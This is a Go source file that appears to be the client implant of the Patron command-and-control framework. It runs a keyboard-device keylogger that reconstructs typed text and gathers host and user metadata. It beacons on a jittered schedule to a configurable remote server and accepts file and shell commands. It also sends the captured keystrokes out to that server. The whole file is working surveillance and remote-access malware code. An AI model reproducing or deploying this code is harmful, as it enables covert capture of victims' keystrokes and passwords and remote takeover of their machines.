package main

import (
	"fmt"
	"io"
	"log"
	"strings"
	"time"

	"github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
	"github.com/PatronC2/Patron/client/client_utils"
	"github.com/PatronC2/Patron/lib/common"
	"github.com/PatronC2/Patron/lib/logger"
	"github.com/PatronC2/linux-keylogger-1/keylogger"
)

var (
	ServerIP          string
	ServerPort        string
	CallbackFrequency string
	CallbackJitter    string
	RootCert          string
	LoggingEnabled    string
	TransportProtocol string
	cache             string
)

func main() {
	*client_utils.ClientConfig.ServerIP = ServerIP
	*client_utils.ClientConfig.ServerPort = ServerPort
	*client_utils.ClientConfig.CallbackFrequency = CallbackFrequency
	*client_utils.ClientConfig.CallbackJitter = CallbackJitter
	*client_utils.ClientConfig.TransportProtocol = TransportProtocol

	client_utils.Initialize(LoggingEnabled)

	keyboard := keylogger.FindKeyboardDevice()
	k, err := keylogger.New(keyboard)
	if err != nil {
		logger.Logf(logger.Error, "Error starting keylogger: %v", err)
		return
	}
	logger.Logf(logger.Debug, "Started keylogger")
	defer k.Close()

	events := k.Read()

	shiftActive := false
	capsLockActive := false

	// Shift mapping for special characters
	shiftMappings := map[string]string{
		"1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
		"6": "^", "7": "&", "8": "*", "9": "(", "0": ")",
		"-": "_", "=": "+", "[": "{", "]": "}", "\\": "|",
		";": ":", "'": "\"", ",": "<", ".": ">", "/": "?",
		"`": "~",
	}

	go func() {
		for e := range events {
			switch e.Type {
			case keylogger.EvKey:
				keyStr := e.KeyString()
				if keyStr == "L_SHIFT" || keyStr == "R_SHIFT" {
					shiftActive = e.KeyPress()
					continue
				}
				if keyStr == "CAPS_LOCK" && e.KeyPress() {
					capsLockActive = !capsLockActive
					continue
				}
				if e.KeyPress() {
					switch keyStr {
					case "SPACE":
						cache += " "
					case "ENTER":
						cache += "\n"
					case "TAB":
						cache += "\t"
					case "BS", "BACKSPACE":
						if len(cache) > 0 {
							cache = cache[:len(cache)-1]
						}
					default:
						if shiftActive && shiftMappings[keyStr] != "" {
							keyStr = shiftMappings[keyStr]
						} else if len(keyStr) == 1 && keyStr >= "a" && keyStr <= "z" {
							if (shiftActive && !capsLockActive) || (!shiftActive && capsLockActive) {
								keyStr = strings.ToUpper(keyStr)
							} else {
								keyStr = strings.ToLower(keyStr)
							}
						} else if len(keyStr) == 1 && keyStr >= "A" && keyStr <= "Z" {
							if !capsLockActive && !shiftActive {
								keyStr = strings.ToLower(keyStr)
							}
						}

						cache += keyStr
					}
				}
			}
		}
	}()

	hostname, username := client_utils.GenerateAgentMetadata()
	filepath := client_utils.GetExecutablePath()
	capabilities := []string{"sh", "bash", "socks", "files", "keylogger"}
	logger.Logf(logger.Info, "Collected startup metadata. Hostname: %v. Username: %v", hostname, username)
	osType, osArch, osVersion, cpus, memory := client_utils.GetOSInfo()

	for {
		config, err := client_utils.LoadCertificate(RootCert, *client_utils.ClientConfig.TransportProtocol)
		if err != nil {
			log.Fatalf("Failed to load certificate: %v\n", err)
		}
		logger.Logf(logger.Info, "Creating a beacon using %v:%v/%v", *client_utils.ClientConfig.ServerIP, *client_utils.ClientConfig.ServerPort, *client_utils.ClientConfig.TransportProtocol)
		beacon, err := client_utils.EstablishConnection(config, *client_utils.ClientConfig.ServerIP, *client_utils.ClientConfig.ServerPort, *client_utils.ClientConfig.TransportProtocol)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		logger.Logf(logger.Info, "Beacon connected")

		ip := client_utils.GetLocalIP(beacon, *client_utils.ClientConfig.ServerIP, *client_utils.ClientConfig.ServerPort, *client_utils.ClientConfig.TransportProtocol)
		agentID, err := client_utils.HandleStartupRequest(beacon, filepath, hostname, username, ip, osType, osArch, osVersion, cpus, memory, capabilities)
		if err != nil {
			client_utils.HandleError(beacon, "startup", err)
			continue
		}
		sleepDuration, err := client_utils.HandleConfigurationRequest(
			beacon, agentID,
			*client_utils.ClientConfig.ServerIP,
			*client_utils.ClientConfig.ServerPort,
			*client_utils.ClientConfig.CallbackFrequency,
			*client_utils.ClientConfig.CallbackJitter,
			*client_utils.ClientConfig.TransportProtocol,
		)
		if err != nil {
			client_utils.HandleError(beacon, "configuration", err)
			continue
		}
		if err := client_utils.HandleFileRequest(beacon, agentID); err != nil {
			client_utils.HandleError(beacon, "file", err)
			continue
		}

		if err := client_utils.HandleCommandRequest(beacon, agentID); err != nil {
			client_utils.HandleError(beacon, "command", err)
			continue
		}

		if err := handleKeysRequest(beacon, agentID); err != nil {
			client_utils.HandleError(beacon, "keylogs", err)
			continue
		}

		beacon.Close()
		logger.Logf(logger.Info, "Beacon successful")

		if sleepDuration > 0 {
			logger.Logf(logger.Info, "Sleeping for %.2fs", sleepDuration.Seconds())
			time.Sleep(sleepDuration)
		} else {
			logger.Logf(logger.Warning, "Server returned non-positive sleep duration. Skipping sleep.")
		}
	}
}

func handleKeysRequest(beacon io.ReadWriteCloser, agentID string) error {

	if cache == "" {
		logger.Logf(logger.Info, "No logs to send, skipping keys request")
		return nil
	}

	logger.Logf(logger.Info, "Sending keylogs: %v", cache)

	req := &patronobuf.Request{
		Type: patronobuf.RequestType_KEYS,
		Payload: &patronobuf.Request_Keys{
			Keys: &patronobuf.KeysRequest{
				Uuid: agentID,
				Keys: cache,
			},
		},
	}

	if err := common.WriteDelimited(beacon, req); err != nil {
		return fmt.Errorf("failed to send keys request: %w", err)
	}

	resp := &patronobuf.Response{}
	if err := common.ReadDelimited(beacon, resp); err != nil {
		return fmt.Errorf("failed to read keys response: %w", err)
	}

	cache = ""
	return nil
}
